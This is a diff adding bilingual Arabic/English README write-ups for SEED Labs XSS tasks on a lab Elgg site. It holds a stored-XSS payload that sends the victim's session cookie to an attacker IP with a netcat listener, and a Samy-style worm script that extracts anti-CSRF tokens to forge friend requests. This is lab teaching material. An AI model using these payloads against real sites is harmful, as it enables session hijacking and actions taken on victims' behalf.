@@ -137,3 +137,86 @@ http://www.seed-server.com
 
    ![login-2](test-5.png)
 
+
+# README - Task 3: Stealing Cookies from the Victim's Machine
+
+## 📌 1. فكرة التاسك والأهداف (Task Concept & Objectives)
+* **الفكرة العامة:** الانتقال من مجرد عرض الكوكيز على شاشة الضحية (كما في Task 2) إلى سرقتها فعلياً وإرسالها إلى جهاز المهاجم (`Attacker's Machine`).
+* **السيناريو الذكي (الحيلة التقنية):** 
+  * نقوم بزرع كود يولد عنصر صورة وهمي (`<img>`) في صفحة الضحية، ويضع في مسارها (`src`) رابط IP الخاص بالمهاجم مرفقاً معه الكوكيز (`document.cookie`).
+  * فور تحميل الصفحة، سيقوم المتصفح بإرسال طلب HTTP GET إلى جهاز المهاجم لجلب الصورة، مما ينتج عنه وصول الكوكيز المسروقة مباشرة إلى سيرفر المهاجم.
+* **الأهداف:**
+  1. إعداد سيرفر استقبال باستخدام أداة الـ Netcat (`nc`) على المنفذ `5555`.
+  2. تنفيذ هجوم حقيقي لسرقة الـ Session Cookies وتوثيق وصولها لجهاز المهاجم.
+
+---
+
+## 📌 1. Task Concept & Objectives (English)
+* **General Idea:** Moving from just displaying cookies locally (Task 2) to actually exfiltrating and sending them to the attacker's machine.
+* **The Attacker Scenario (The Trick):** 
+  * We inject a script that dynamically creates a fake `<img>` tag pointing to the attacker's IP (`10.9.0.1`) with the victim's cookies appended in the query string (`?c=...`).
+  * When the page loads, the browser automatically sends an HTTP GET request to the attacker to fetch the "image", successfully leaking the session cookies.
+* **Objectives:**
+  1. Set up a listener server using Netcat (`nc`) on port `5555`.
+  2. Execute the payload to successfully steal session cookies and capture them on the attacker's end.
+
+---
+
+## 🛠️ 2. خطوات التنفيذ العملية (Step-by-Step Implementation)
+1. **تشغيل مستقبل الاتصالات (سيرفر المهاجم):** فتح التيرمينال وتشغيل أداة `nc` للاستماع على المنفذ `5555`:
+   ```bash
+   nc -lknv 5555
+   ```
+   * 1-الانتقال إلى صفحة تعديل الملف الشخصي لـ Alice وضبط خانة الوصف باستخدام وضع Edit HTML.
+
+إدخال كود السرقة الخبيث التالي:
+```bash
+<script>document.write('<img src=[http://10.9.0.1:5555?c=](http://10.9.0.1:5555?c=)' + escape(document.cookie) + ' >');</script>
+```
+* save
+* زيارة صفحة الملف الشخصي لملاحظة استلام الكوكيز مباشرة داخل شاشة التيرمينال الخاصة بأداة nc.
+   ![login-2](test-6.png)
+
+# README - Task 4: Becoming the Victim's Friend (The XSS Worm)
+
+## 📌 1. فكرة التاسك والأهداف (Task Concept & Objectives)
+* **الفكرة العامة:** بناء أول نموذج لدودة سيبرانية تعتمد على الـ XSS (**XSS Worm**)، محاكاة لهجوم دودة MySpace الشهيرة عام 2005، بحيث يقوم الكود بإجبار أي زائر لصفحة "سامي" على إضافته كصديق تلقائياً.
+* **السيناريو الذكي:** 
+  * نقوم بدور **"Samy" (المهاجم)** بزرع سكريبت خفي في ملفه الشخصي يرسل طلباً خفياً (`AJAX Request`) للموقع ليقوم الزائر بإضافته كصديق دون تدخله أو علمه.
+* **الأهداف:**
+  1. فهم كيفية تجاوز حماية الموقع (`Anti-CSRF Tokens`) عبر استخراجها برمجياً في السطور 1 و 2.
+  2. إرسال طلب `AJAX GET` خفي عبر المتصفح لتنفيذ إجراءات بالنيابة عن الضحية.
+
+---
+
+## 📌 1. Task Concept & Objectives (English)
+* **General Idea:** Building the first XSS worm model, mimicking the famous 2005 MySpace Samy worm, where any visitor to Samy's profile automatically adds Samy as a friend.
+* **The Attacker Scenario:** 
+  * Acting as **"Samy" (The Attacker)**, we inject a script that executes an invisible `AJAX request` from the victim's browser to add Samy to their friend list automatically.
+* **Objectives:**
+  1. Understand how to bypass site security (`Anti-CSRF Tokens`) by programmatically extracting them in lines 1 and 2.
+  2. Forge and send an invisible `AJAX GET` request to perform actions on behalf of the victim.
+
+---
+
+## 🛠️ 2. خطوات التنفيذ العملية (Step-by-Step Implementation)
+1. تسجيل الدخول بحساب **Samy** والانتقال إلى صفحة **Edit profile**.
+2. تفعيل وضع **Edit HTML** لضمان إدخال السكريبت الخام دون تعديل.
+3. إدخال الكود المكتمل مع وضع الرابط الصحيح في خانة `sendurl`:
+   ```html
+   <script type="text/javascript">
+   window.onload = function () {
+     var Ajax = null;
+     var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+     var token="&__elgg_token="+elgg.security.token.__elgg_token;
+     var sendurl="[http://www.seed-server.com/action/friends/add?friend=59](http://www.seed-server.com/action/friends/add?friend=59)" + ts + token; 
+     Ajax = new XMLHttpRequest();
+     Ajax.open("GET", sendurl, true);
+     Ajax.send();
+   }
+   </script>
+   ```
+   * save
+   * تسجيل الخروج والدخول بحساب ضحية آخر (مثل Bob)، ثم زيارة صفحة سامي الشخصية للتأكد من إضافة سامي تلقائياً لقائمة أصدقاء الضحية.
+   
+   ![login-2](test-7.png)
